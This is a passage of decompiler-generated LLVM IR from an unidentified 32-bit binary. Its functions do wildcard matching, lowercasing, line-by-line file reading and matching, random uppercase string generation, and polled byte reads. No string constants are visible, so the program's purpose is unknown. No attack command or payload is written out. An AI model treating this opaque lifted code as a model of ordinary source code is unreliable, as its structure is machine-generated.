  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_94c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_94b8, { 1, 0 }
}

define i32 @function_94d8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_94d8:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_94dc = load i32, i32* @r4, align 4
  %v6_94dc = load i32, i32* @fp, align 4
  store i32 38116, i32* %stack_var_-4, align 4
  %v2_94e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_94e0, i32* @fp, align 4
  %v2_94f4 = load i8, i8* %arg1, align 1
  %v7_9500 = icmp eq i8 %v2_94f4, 42
  br i1 %v7_9500, label %dec_label_pc_9534, label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94d8
  %v7_950c = icmp eq i8 %v2_94f4, 63
  br i1 %v7_950c, label %dec_label_pc_95a4, label %dec_label_pc_9514

dec_label_pc_9514:                                ; preds = %dec_label_pc_9508
  %v2_9518 = icmp eq i8 %v2_94f4, 0
  br i1 %v2_9518, label %dec_label_pc_9524, label %dec_label_pc_95fc

dec_label_pc_9524:                                ; preds = %dec_label_pc_9514
  %v2_9528 = load i8, i8* %tmp, align 1
  %v3_9528 = zext i8 %v2_9528 to i32
  br label %dec_label_pc_9670

dec_label_pc_9534:                                ; preds = %dec_label_pc_94d8
  %v1_9538 = add i32 %tmp9, 1
  %v3_9544 = inttoptr i32 %v1_9538 to i8*
  %v4_9544 = call i32 @function_94d8(i8* %v3_9544, i32 %arg2)
  %v2_954c = icmp eq i32 %v4_9544, 0
  br i1 %v2_954c, label %dec_label_pc_9590, label %dec_label_pc_9554

dec_label_pc_9554:                                ; preds = %dec_label_pc_9534
  %v2_9558 = load i8, i8* %tmp, align 1
  %v2_955c = icmp eq i8 %v2_9558, 0
  br i1 %v2_955c, label %dec_label_pc_9598, label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9554
  %v1_9568 = add i32 %arg2, 1
  %v4_9574 = call i32 @function_94d8(i8* nonnull %arg1, i32 %v1_9568)
  %v2_957c = icmp eq i32 %v4_9574, 0
  br i1 %v2_957c, label %dec_label_pc_9590, label %dec_label_pc_9598

dec_label_pc_9590:                                ; preds = %dec_label_pc_9564, %dec_label_pc_9534
  br label %dec_label_pc_9598

dec_label_pc_9598:                                ; preds = %dec_label_pc_9554, %dec_label_pc_9564, %dec_label_pc_9590
  %storemerge4 = phi i32 [ 0, %dec_label_pc_9590 ], [ 1, %dec_label_pc_9564 ], [ 1, %dec_label_pc_9554 ]
  br label %dec_label_pc_9670

dec_label_pc_95a4:                                ; preds = %dec_label_pc_9508
  %v2_95a8 = load i8, i8* %tmp, align 1
  %v2_95ac = icmp eq i8 %v2_95a8, 0
  br i1 %v2_95ac, label %dec_label_pc_95f0, label %dec_label_pc_95b4

dec_label_pc_95b4:                                ; preds = %dec_label_pc_95a4
  %v1_95b8 = add i32 %tmp9, 1
  %v1_95c0 = add i32 %arg2, 1
  %v2_95cc = inttoptr i32 %v1_95b8 to i8*
  %v3_95cc = call i32 @function_94d8(i8* %v2_95cc, i32 %v1_95c0)
  %v2_95d4 = icmp ne i32 %v3_95cc, 0
  %. = zext i1 %v2_95d4 to i32
  br label %dec_label_pc_95f0

dec_label_pc_95f0:                                ; preds = %dec_label_pc_95b4, %dec_label_pc_95a4
  %storemerge3 = phi i32 [ 1, %dec_label_pc_95a4 ], [ %., %dec_label_pc_95b4 ]
  br label %dec_label_pc_9670

dec_label_pc_95fc:                                ; preds = %dec_label_pc_9514
  %v2_9600 = load i8, i8* %arg1, align 1
  %v3_9600 = zext i8 %v2_9600 to i32
  %v1_9608 = call i32 @function_109e4(i32 %v3_9600)
  store i32 %v1_9608, i32* @r4, align 4
  %v2_9614 = load i8, i8* %tmp, align 1
  %v3_9614 = zext i8 %v2_9614 to i32
  %v1_961c = call i32 @function_109e4(i32 %v3_9614)
  %v0_9624 = load i32, i32* @r4, align 4
  %v9_9624 = icmp eq i32 %v0_9624, %v1_961c
  br i1 %v9_9624, label %dec_label_pc_962c, label %dec_label_pc_9668

dec_label_pc_962c:                                ; preds = %dec_label_pc_95fc
  %v1_9630 = add i32 %tmp9, 1
  %v1_9638 = add i32 %arg2, 1
  %v2_9644 = inttoptr i32 %v1_9630 to i8*
  %v3_9644 = call i32 @function_94d8(i8* %v2_9644, i32 %v1_9638)
  %v2_964c = icmp ne i32 %v3_9644, 0
  %.8 = zext i1 %v2_964c to i32
  br label %dec_label_pc_9668

dec_label_pc_9668:                                ; preds = %dec_label_pc_962c, %dec_label_pc_95fc
  %storemerge = phi i32 [ 1, %dec_label_pc_95fc ], [ %.8, %dec_label_pc_962c ]
  br label %dec_label_pc_9670

dec_label_pc_9670:                                ; preds = %dec_label_pc_95f0, %dec_label_pc_9598, %dec_label_pc_9524, %dec_label_pc_9668
  %stack_var_-44.0 = phi i32 [ %storemerge4, %dec_label_pc_9598 ], [ %storemerge3, %dec_label_pc_95f0 ], [ %v3_9528, %dec_label_pc_9524 ], [ %storemerge, %dec_label_pc_9668 ]
  store i32 %v3_94dc, i32* @r4, align 4
  store i32 %v6_94dc, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9670, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9598, { 2, 1, 0 }
}

define i32 @function_9680(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_9680:
  store i32 %arg1, i32* @r0, align 4
  %v1_96a0 = call i32 @function_124d4(i32 %arg1)
  store i32 %v1_96a0, i32* %arg2, align 4
  %v3_96b8 = icmp eq i32 %v1_96a0, -1
  %. = zext i1 %v3_96b8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_96e4(i8* %arg1) local_unnamed_addr {
dec_label_pc_96e4:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_96f4 = load i32, i32* %r0.global-to-local, align 4
  %storemerge1 = inttoptr i32 %v0_96f4 to i8*
  store i8* %storemerge1, i8** %stack_var_-20, align 4
  %v2_972c2 = load i8, i8* %storemerge1, align 1
  %v2_97304 = icmp eq i8 %v2_972c2, 0
  br i1 %v2_97304, label %dec_label_pc_9738, label %dec_label_pc_96fc

dec_label_pc_96fc:                                ; preds = %dec_label_pc_96e4, %dec_label_pc_96fc
  %v2_97387 = phi i8* [ %storemerge, %dec_label_pc_96fc ], [ %storemerge1, %dec_label_pc_96e4 ]
  %v2_9700 = load i8, i8* %v2_97387, align 1
  %v3_9700 = zext i8 %v2_9700 to i32
  store i32 %v3_9700, i32* %r0.global-to-local, align 4
  %v1_9708 = call i32 @function_109e4(i32 %v3_9700)
  store i32 %v1_9708, i32* %r0.global-to-local, align 4
  %v3_9714 = load i8*, i8** %stack_var_-20, align 4
  %v1_9718 = trunc i32 %v1_9708 to i8
  store i8 %v1_9718, i8* %v3_9714, align 1
  %v4_971c = ptrtoint i8* %v3_9714 to i32
  %v1_9720 = add i32 %v4_971c, 1
  %storemerge = inttoptr i32 %v1_9720 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_972c = load i8, i8* %storemerge, align 1
  %v2_9730 = icmp eq i8 %v2_972c, 0
  br i1 %v2_9730, label %dec_label_pc_9728.dec_label_pc_9738_crit_edge, label %dec_label_pc_96fc

dec_label_pc_9728.dec_label_pc_9738_crit_edge:    ; preds = %dec_label_pc_96fc
  %v13_9738.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_9728.dec_label_pc_9738_crit_edge, %dec_label_pc_96e4
  %v13_9738 = phi i32 [ %v13_9738.pre, %dec_label_pc_9728.dec_label_pc_9738_crit_edge ], [ %v0_96f4, %dec_label_pc_96e4 ]
  ret i32 %v13_9738

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_96fc, { 1, 0 }
}

define i32 @function_973c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_973c:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9740 = load i32, i32* @fp, align 4
  store i32 %v3_9740, i32* %stack_var_-16, align 4
  %v13_9740 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v13_9740, i32* @r2, align 4
  %v4_9768 = call i32 @function_107f8(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_16d24.57, i32 0, i32 0), i32 0)
  %v2_992c = ptrtoint i32* %stack_var_-4120 to i32
  %v1_9788 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9924

dec_label_pc_9778:                                ; preds = %dec_label_pc_9924
  %v2_9788 = call i32 @function_96e4(i8* %v1_9788)
  %v4_97a0 = call i32 @function_1214c(i32 %v2_992c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_16d34.59, i32 0, i32 0))
  %v9_97b8 = icmp eq i32 %v4_97a0, %v2_992c
  br i1 %v9_97b8, label %dec_label_pc_97c0, label %dec_label_pc_9908

dec_label_pc_97c0:                                ; preds = %dec_label_pc_9778
  %tmp18 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_97e4

dec_label_pc_97d8:                                ; preds = %dec_label_pc_9804, %dec_label_pc_97f4, %dec_label_pc_97e4
  %v1_97dc = add i32 %v4_97e4, 1
  %v5_97e0 = inttoptr i32 %v1_97dc to i8*
  br label %dec_label_pc_97e4

dec_label_pc_97e4:                                ; preds = %dec_label_pc_97c0, %dec_label_pc_97d8
  %storemerge2 = phi i8* [ %v5_97e0, %dec_label_pc_97d8 ], [ %tmp18, %dec_label_pc_97c0 ]
  %v4_97e4 = ptrtoint i8* %storemerge2 to i32
  %v2_97e8 = load i8, i8* %storemerge2, align 1
  %v7_97ec = icmp eq i8 %v2_97e8, 32
  br i1 %v7_97ec, label %dec_label_pc_97d8, label %dec_label_pc_97f4

dec_label_pc_97f4:                                ; preds = %dec_label_pc_97e4
  %v2_97f8 = load i8, i8* %storemerge2, align 1
  %v7_97fc = icmp eq i8 %v2_97f8, 9
  br i1 %v7_97fc, label %dec_label_pc_97d8, label %dec_label_pc_9804

dec_label_pc_9804:                                ; preds = %dec_label_pc_97f4
  %v2_9808 = load i8, i8* %storemerge2, align 1
  %v7_980c = icmp eq i8 %v2_9808, 58
  br i1 %v7_980c, label %dec_label_pc_97d8, label %dec_label_pc_9840.preheader

dec_label_pc_9840.preheader:                      ; preds = %dec_label_pc_9804
  %v2_9858 = add i32 %v4_97e4, -1
  br label %dec_label_pc_9840

dec_label_pc_9818:                                ; preds = %dec_label_pc_986c, %dec_label_pc_9840
  store i32 %v4_97e4, i32* @r0, align 4
  %v0_9820 = call i32 @function_11e30()
  %v1_9834 = add i32 %v2_9858, %v0_9820
  %v3_983c = inttoptr i32 %v1_9834 to i8*
  store i8 0, i8* %v3_983c, align 1
  br label %dec_label_pc_9840

dec_label_pc_9840:                                ; preds = %dec_label_pc_9840.preheader, %dec_label_pc_9818
  store i32 %v4_97e4, i32* @r0, align 4
  %v0_9848 = call i32 @function_11e30()
  %v1_985c = add i32 %v0_9848, %v2_9858
  %v1_9860 = inttoptr i32 %v1_985c to i8*
  %v2_9860 = load i8, i8* %v1_9860, align 1
  %v7_9864 = icmp eq i8 %v2_9860, 13
  br i1 %v7_9864, label %dec_label_pc_9818, label %dec_label_pc_986c

dec_label_pc_986c:                                ; preds = %dec_label_pc_9840
  store i32 %v4_97e4, i32* @r0, align 4
  %v0_9874 = call i32 @function_11e30()
  %v1_9888 = add i32 %v0_9874, %v2_9858
  %v1_988c = inttoptr i32 %v1_9888 to i8*
  %v2_988c = load i8, i8* %v1_988c, align 1
  %v7_9890 = icmp eq i8 %v2_988c, 10
  br i1 %v7_9890, label %dec_label_pc_9818, label %dec_label_pc_9898

dec_label_pc_9898:                                ; preds = %dec_label_pc_986c
  %v2_98a4 = call i32 @function_11e90(i32 %v4_97e4, i32 46)
  %v2_98ac = icmp eq i32 %v2_98a4, 0
  br i1 %v2_98ac, label %dec_label_pc_98d0, label %dec_label_pc_98b4

dec_label_pc_98b4:                                ; preds = %dec_label_pc_9898
  %v2_98c0 = call i32 @function_11e90(i32 %v4_97e4, i32 46)
  %v3_98cc = inttoptr i32 %v2_98c0 to i8*
  store i8 0, i8* %v3_98cc, align 1
  br label %dec_label_pc_98d0

dec_label_pc_98d0:                                ; preds = %dec_label_pc_9898, %dec_label_pc_98b4
  %v3_98ec = call i32 @function_11f98(i32 %arg1, i8* %storemerge2)
  %v1_98f4 = call i32 @function_10678(i32 %v4_9768)
  br label %dec_label_pc_9960

dec_label_pc_9908:                                ; preds = %dec_label_pc_9778
  store i32 4096, i32* @r2, align 4
  %v3_9920 = call i32 @function_11d70(i8* %v1_9788, i32 0)
  br label %dec_label_pc_9924

dec_label_pc_9924:                                ; preds = %dec_label_pc_973c, %dec_label_pc_9908
  %v4_993c = call i32 @function_9388(i32 %v2_992c, i32 4096, i32 %v4_9768, i32 %v2_992c)
  %v2_9944 = icmp eq i32 %v4_993c, 0
  br i1 %v2_9944, label %dec_label_pc_994c, label %dec_label_pc_9778

dec_label_pc_994c:                                ; preds = %dec_label_pc_9924
  %v1_9950 = call i32 @function_10678(i32 %v4_9768)
  br label %dec_label_pc_9960

dec_label_pc_9960:                                ; preds = %dec_label_pc_98d0, %dec_label_pc_994c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_994c ], [ 0, %dec_label_pc_98d0 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9858, { 1, 2, 0 }
  uselistorder i32 %v4_97e4, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i8* %storemerge2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_992c, { 0, 3, 1, 2 }
  uselistorder i32 %v4_9768, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i8 58, { 1, 0 }
  uselistorder label %dec_label_pc_9960, { 1, 0 }
  uselistorder label %dec_label_pc_9924, { 1, 0 }
  uselistorder label %dec_label_pc_98d0, { 1, 0 }
  uselistorder label %dec_label_pc_9840, { 1, 0 }
  uselistorder label %dec_label_pc_97e4, { 1, 0 }
}

define i32 @function_997c(i32 %arg1) local_unnamed_addr {
dec_label_pc_997c:
  %stack_var_-4120 = alloca i32, align 4
  %v2_998c = ptrtoint i32* %stack_var_-4120 to i32
  %v4_99a0 = call i32 @function_107f8(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_16d24.57, i32 0, i32 0), i32 0)
  %v1_99c0 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9a1c

dec_label_pc_99b0:                                ; preds = %dec_label_pc_9a1c
  %v2_99c0 = call i32 @function_96e4(i8* %v1_99c0)
  %v4_99d8 = call i32 @function_1214c(i32 %v2_998c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_16d34.59, i32 0, i32 0))
  %v9_99ec = icmp eq i32 %v4_99d8, %v2_998c
  br i1 %v9_99ec, label %dec_label_pc_99f4, label %dec_label_pc_9a00

dec_label_pc_99f4:                                ; preds = %dec_label_pc_99b0
  %v1_99f8 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9a00

dec_label_pc_9a00:                                ; preds = %dec_label_pc_99b0, %dec_label_pc_99f4
  %stack_var_-24.0 = phi i32 [ %v1_99f8, %dec_label_pc_99f4 ], [ %stack_var_-24.1, %dec_label_pc_99b0 ]
  store i32 4096, i32* @r2, align 4
  %v3_9a18 = call i32 @function_11d70(i8* %v1_99c0, i32 0)
  br label %dec_label_pc_9a1c

dec_label_pc_9a1c:                                ; preds = %dec_label_pc_997c, %dec_label_pc_9a00
  %stack_var_-24.1 = phi i32 [ 0, %dec_label_pc_997c ], [ %stack_var_-24.0, %dec_label_pc_9a00 ]
  %v4_9a34 = call i32 @function_9388(i32 %v2_998c, i32 4096, i32 %v4_99a0, i32 %v2_998c)
  %v2_9a3c = icmp eq i32 %v4_9a34, 0
  br i1 %v2_9a3c, label %dec_label_pc_9a44, label %dec_label_pc_99b0

dec_label_pc_9a44:                                ; preds = %dec_label_pc_9a1c
  %v1_9a48 = call i32 @function_10678(i32 %v4_99a0)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_998c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_9a1c, { 1, 0 }
  uselistorder label %dec_label_pc_9a00, { 1, 0 }
}

define i32 @function_9a64(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9a64:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9a68 = load i32, i32* @r4, align 4
  %v6_9a68 = load i32, i32* @fp, align 4
  store i32 39536, i32* %stack_var_-4, align 4
  %v2_9a6c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a6c, i32* @fp, align 4
  %v0_9a74 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_9ae017 = icmp sgt i32 %arg2, 0
  br i1 %v5_9ae017, label %dec_label_pc_9a90, label %dec_label_pc_9ae4

dec_label_pc_9a90:                                ; preds = %dec_label_pc_9a64, %dec_label_pc_9a90
  %storemerge118 = phi i32 [ %v1_9acc, %dec_label_pc_9a90 ], [ 0, %dec_label_pc_9a64 ]
  %v2_9a9c = add i32 %storemerge118, %v0_9a74
  store i32 %v2_9a9c, i32* @r4, align 4
  %v0_9aa0 = call i32 @function_8400()
  store i32 %v0_9aa0, i32* %r0.global-to-local, align 4
  %v2_9ab0 = call i32 @function_10328(i32 %v0_9aa0, i32 26)
  store i32 %v2_9ab0, i32* %r0.global-to-local, align 4
  %fold = add i32 %v2_9ab0, 65
  %v1_9ac4 = trunc i32 %fold to i8
  %v2_9ac4 = load i32, i32* @r4, align 4
  %v3_9ac4 = inttoptr i32 %v2_9ac4 to i8*
  store i8 %v1_9ac4, i8* %v3_9ac4, align 1
  %v1_9acc = add i32 %storemerge118, 1
  %v3_9ad8.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9ae0 = icmp slt i32 %v1_9acc, %v3_9ad8.pre
  br i1 %v5_9ae0, label %dec_label_pc_9a90, label %dec_label_pc_9ad4.dec_label_pc_9ae4_crit_edge

dec_label_pc_9ad4.dec_label_pc_9ae4_crit_edge:    ; preds = %dec_label_pc_9a90
  %v12_9ae8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9ae4

dec_label_pc_9ae4:                                ; preds = %dec_label_pc_9ad4.dec_label_pc_9ae4_crit_edge, %dec_label_pc_9a64
  %v12_9ae8 = phi i32 [ %v12_9ae8.pre, %dec_label_pc_9ad4.dec_label_pc_9ae4_crit_edge ], [ %v0_9a74, %dec_label_pc_9a64 ]
  store i32 %v3_9a68, i32* @r4, align 4
  store i32 %v6_9a68, i32* @fp, align 4
  ret i32 %v12_9ae8

; uselistorder directives
  uselistorder i32 %v1_9acc, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder i32 65, { 1, 0 }
  uselistorder label %dec_label_pc_9a90, { 1, 0 }
}

define i32 @function_9aec(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9b40.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9af0 = load i32, i32* @fp, align 4
  store i32 %v3_9af0, i32* %stack_var_-16, align 4
  store i32 39672, i32* %stack_var_-4, align 4
  %v2_9af4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9af4, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9b18 = call i32 @function_11d70(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9b2c = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9b40

dec_label_pc_9b40:                                ; preds = %dec_label_pc_9b40.lr.ph, %dec_label_pc_9b40
  %storemerge527 = phi i32 [ 0, %dec_label_pc_9b40.lr.ph ], [ %v1_9b54, %dec_label_pc_9b40 ]
  %v5_9b4c = mul nuw nsw i32 %storemerge527, 4
  %v6_9b4c = add i32 %v5_9b4c, %v2_9b2c
  %v7_9b4c = inttoptr i32 %v6_9b4c to i32*
  store i32 0, i32* %v7_9b4c, align 4
  %v1_9b54 = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_9b54, 32
  br i1 %tmp52, label %dec_label_pc_9b40, label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9b40
  %v13_9af0 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9b6c = udiv i32 %arg1, 32
  %v3_9b78 = mul nuw nsw i32 %v3_9b6c, 4
  %v2_9b80 = add nsw i32 %v3_9b78, -160
  %v2_9b84 = add i32 %v2_9b80, %v13_9af0
  %v1_9b88 = inttoptr i32 %v2_9b84 to i32*
  %v2_9b88 = load i32, i32* %v1_9b88, align 4
  %v1_9b90 = urem i32 %arg1, 32
  %v6_9b98 = shl i32 1, %v1_9b90
  %v2_9b9c = or i32 %v2_9b88, %v6_9b98
  store i32 %v2_9b9c, i32* %v1_9b88, align 4
  %v1_9bbc = add i32 %arg1, 1
  %v2_9bc8 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9bdc = call i32 @function_108bc(i32 %v1_9bbc, i32 %v2_9b2c, i32 0, i32 %v2_9b2c, i32 %v2_9bc8)
  %v5_9bf0 = icmp sgt i32 %v5_9bdc, 0
  br i1 %v5_9bf0, label %dec_label_pc_9d84.preheader, label %dec_label_pc_9cf0.preheader

dec_label_pc_9cf0.preheader:                      ; preds = %dec_label_pc_9b68
  %v7_9cf823 = icmp slt i32 %tmp33, 10
  br i1 %v7_9cf823, label %dec_label_pc_9c30.lr.ph, label %dec_label_pc_9d84.preheader

dec_label_pc_9c30.lr.ph:                          ; preds = %dec_label_pc_9cf0.preheader, %dec_label_pc_9ce4
  %stack_var_-44.024 = phi i32 [ %v1_9ce8, %dec_label_pc_9ce4 ], [ %tmp33, %dec_label_pc_9cf0.preheader ]
  %v2_9bfc = load i32, i32* @global_var_205d0.63, align 4
  %v3_9c08 = call i32 @function_8eb4(i32 %v2_9bfc, i32 ptrtoint ([5 x i8]* @global_var_16d40.65 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9c30

dec_label_pc_9c30:                                ; preds = %dec_label_pc_9c30.lr.ph, %dec_label_pc_9c30
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9c30.lr.ph ], [ %v1_9c44, %dec_label_pc_9c30 ]
  %v5_9c3c = mul nuw nsw i32 %storemerge615, 4
  %v6_9c3c = add i32 %v5_9c3c, %v2_9b2c
  %v7_9c3c = inttoptr i32 %v6_9c3c to i32*
  store i32 0, i32* %v7_9c3c, align 4
  %v1_9c44 = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9c44, 32
  br i1 %tmp53, label %dec_label_pc_9c30, label %dec_label_pc_9c58

dec_label_pc_9c58:                                ; preds = %dec_label_pc_9c30
  %v2_9c78 = load i32, i32* %v1_9b88, align 4
  %v2_9c8c = or i32 %v2_9c78, %v6_9b98
  store i32 %v2_9c8c, i32* %v1_9b88, align 4
  store i32 0, i32* @r2, align 4
  %v5_9ccc = call i32 @function_108bc(i32 %v1_9bbc, i32 %v2_9b2c, i32 0, i32 %v2_9b2c, i32 %v2_9bc8)
  %v5_9ce0 = icmp sgt i32 %v5_9ccc, 0
  br i1 %v5_9ce0, label %dec_label_pc_9d84.preheader, label %dec_label_pc_9ce4

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9c58
  %v1_9ce8 = add nsw i32 %stack_var_-44.024, 1
  %v7_9cf8 = icmp slt i32 %v1_9ce8, 10
  br i1 %v7_9cf8, label %dec_label_pc_9c30.lr.ph, label %dec_label_pc_9d84.preheader

dec_label_pc_9d84.preheader:                      ; preds = %dec_label_pc_9ce4, %dec_label_pc_9c58, %dec_label_pc_9cf0.preheader, %dec_label_pc_9b68
  %v5_9d2c = bitcast i8* %stack_var_-185 to i32*
  %not.v7_9d8c57 = icmp sgt i32 %arg3, 1
  %v2_9da459 = icmp eq i1 %not.v7_9d8c57, false
  br i1 %v2_9da459, label %dec_label_pc_9dac, label %dec_label_pc_9d10

dec_label_pc_9d10:                                ; preds = %dec_label_pc_9d84.preheader, %dec_label_pc_9d78
  %v1_9d8862.in = phi i32 [ %v1_9d8862, %dec_label_pc_9d78 ], [ %arg3, %dec_label_pc_9d84.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9d68, %dec_label_pc_9d78 ], [ %arg2, %dec_label_pc_9d84.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_9d7c, %dec_label_pc_9d78 ], [ 0, %dec_label_pc_9d84.preheader ]
  %v1_9d8862 = add i32 %v1_9d8862.in, -1
  %v2_9d14 = load i32, i32* @global_var_205d0.63, align 4
  %v6_9d2c = call i32 @function_12580(i32 %v2_9d14, i32* %v5_9d2c, i32 1, i32 0, i32 %v1_9d8862)
  %v7_9d34 = icmp eq i32 %v6_9d2c, 1
  br i1 %v7_9d34, label %dec_label_pc_9d54, label %dec_label_pc_9d3c

dec_label_pc_9d3c:                                ; preds = %dec_label_pc_9d10
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9dc0

dec_label_pc_9d54:                                ; preds = %dec_label_pc_9d10
  %v3_9d54 = load i8, i8* %stack_var_-185, align 1
  %v4_9d58 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9d54, i8* %stack_var_-40.061, align 1
  %v1_9d64 = add i32 %v4_9d58, 1
  %v5_9d68 = inttoptr i32 %v1_9d64 to i8*
  %v3_9d6c = load i8, i8* %stack_var_-185, align 1
  %v7_9d70 = icmp eq i8 %v3_9d6c, 10
  br i1 %v7_9d70, label %dec_label_pc_9dac, label %dec_label_pc_9d78

dec_label_pc_9d78:                                ; preds = %dec_label_pc_9d54
  %v1_9d7c = add i32 %stack_var_-36.060, 1
  %not.v7_9d8c = icmp sgt i32 %v1_9d8862, 1
  %v2_9da4 = icmp eq i1 %not.v7_9d8c, false
  br i1 %v2_9da4, label %dec_label_pc_9dac, label %dec_label_pc_9d10

dec_label_pc_9dac:                                ; preds = %dec_label_pc_9d54, %dec_label_pc_9d78, %dec_label_pc_9d84.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9d84.preheader ], [ %v1_9d7c, %dec_label_pc_9d78 ], [ %stack_var_-36.060, %dec_label_pc_9d54 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9d84.preheader ], [ %v5_9d68, %dec_label_pc_9d78 ], [ %v5_9d68, %dec_label_pc_9d54 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9dc0

dec_label_pc_9dc0:                                ; preds = %dec_label_pc_9d3c, %dec_label_pc_9dac
  %storemerge = phi i32 [ -1, %dec_label_pc_9d3c ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9dac ]
  %v2_9dcc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9dcc, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9d8862, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9ce8, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_9b2c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9dc0, { 1, 0 }
  uselistorder label %dec_label_pc_9dac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9d10, { 1, 0 }
  uselistorder label %dec_label_pc_9c30, { 1, 0 }
  uselistorder label %dec_label_pc_9c30.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9b40, { 1, 0 }
}

define i32 @function_9dd8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9dd8:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
